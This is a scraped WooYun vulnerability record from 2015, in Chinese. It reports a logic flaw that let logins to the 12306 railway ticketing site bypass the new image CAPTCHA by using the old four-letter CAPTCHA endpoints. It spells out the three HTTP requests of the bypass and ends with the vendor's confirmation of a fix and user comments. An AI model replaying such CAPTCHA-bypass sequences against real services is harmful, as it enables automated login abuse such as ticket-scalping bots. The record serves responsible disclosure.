{"id": 42850, "wybug_id": "wooyun-2015-0103427", "wybug_title": "12306新版选择图片验证码存在逻辑漏洞导致限制可被绕过（理论可以令抢票软件复活）", "wybug_corp": "12306", "wybug_author": "路人甲", "wybug_date": "2015-03-24 16:24", "wybug_open_date": "2015-05-08 19:36", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向公众公开  简要描述： 新的选择图片验证码确实比之前的4个字母的验证码难度高, 中文识别也有难度, 但是目前发现12306的新图片选择验证码有可绕过的漏洞, 应该是更新不全面造成的漏洞. 详细说明：  12306 新的图片验证码可以被绕过, 可以继续用老的4字母验证码登陆12306 . 老的4字母验证码比较容易电脑识别, 可以用注册或其他验证码接口直接登录.漏洞1:https://kyfw.12306.cn/otn/passcodeNew/getPassCodeNew?module=regist&rand=sjrand&0.54322674895787漏洞2:https://kyfw.12306.cn/otn/passcodeNew/getPassCodeNew?module=other&rand=sjrand&0.36124213441517变换moudle，即可获取不同操作的验证码，如订单是 passenger 。这两个连接可以获取4字母验证码, 12306登陆接口可以用这里识别的验证码直接登录. 这个情况下, 新的图片验证码形同虚设.   漏洞证明：  \n\n\n\n\n\n\n\n1. 先获取验证码(老的4字母验证码)\nGET https://kyfw.12306.cn/otn/passcodeNew/getPassCodeNew?module=regist&rand=sjrand&0.54322674895787 HTTP/1.1\n2. 电脑识别验证码, 检查验证码正确\nPOST https://kyfw.12306.cn/otn/passcodeNew/checkRandCodeAnsyn HTTP/1.1randCode=9npm&rand=sjrand&randCode_validate=\n3. Post到Login网址, 即可登陆\nPOST https://kyfw.12306.cn/otn/login/loginAysnSuggest HTTP/1.1loginUserDTO.user_name=xxxx&userDTO.password=xxxx&randCode=9npm&randCode_validate=&MTA4OTAx=Yzk1NzdkZGMwZTBiYTE4Nw==&myversion=undefined{\"validateMessagesShowId\":\"_validatorMessage\",\"status\":true,\"httpstatus\":200,\"data\":{\"loginCheck\":\"Y\"},\"messages\":[],\"validateMessages\":{}}\n完全没用到选择图片的验证码.   修复方案：  建议全面更新验证码, 排查老验证码漏洞.   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-03-24 19:34 厂商回复： 正在评估，谢谢！ 最新状态： 2015-03-24：今晚将修复此漏洞。谢谢！ 2015-03-25：漏洞已修复，谢谢！  ", "replys": "漏洞评价：\n评论\n     2015-03-24 16:26 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  扼杀在萌芽期    \n     2015-03-24 16:49 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  抢票软件会不会眼红 - -     \n     2015-03-24 16:50 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  抢票软件会不会眼红 - -    \n     2015-03-24 16:50 |    \t\t鸟云厂商  \t\t\t( 核心白帽子 |\t\t\t        Rank:1313 漏洞数:146        | 中国菜鸟)\t\t \n  @疯狗 @浩天 保护好路人甲ಥ_ಥ    \n     2015-03-24 16:51 |    \t\tNaih \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 无趣之人)\t\t \n  你们这样可不行哦，    \n     2015-03-24 17:18 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  来一发    \n     2015-03-24 17:21 |    \t\tKeen \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | ...)\t\t \n  哈哈，12306好伤心    \n     2015-03-24 17:52 |    \t\tsdc1992 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:12        )\t\t \n  矛与盾的斗争~    \n     2015-03-24 19:57 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  12306又一次被突破    \n     2015-03-24 20:10 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  火力再次开向12306    \n     2015-03-24 20:29 |    \t\t木鱼 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 木鱼。)\t\t \n  前排支持，希望此类会导致被恶意利用的漏洞尽可能被发现并修复。    \n     2015-03-25 02:06 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-03-25 11:31 |    \t\t贾小仙 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 成功----成功就是按照自己的方式去度过人生...)\t\t \n  具体如何实现绕过？    \n     2015-03-25 15:37 |    \t\t兔八哥 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 我心飞 翔)\t\t \n  打雷了    \n     2015-04-04 22:19 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  不会被抢票软件雇人群殴吗    \n     2015-04-14 10:02 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  12306又一次被突破    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}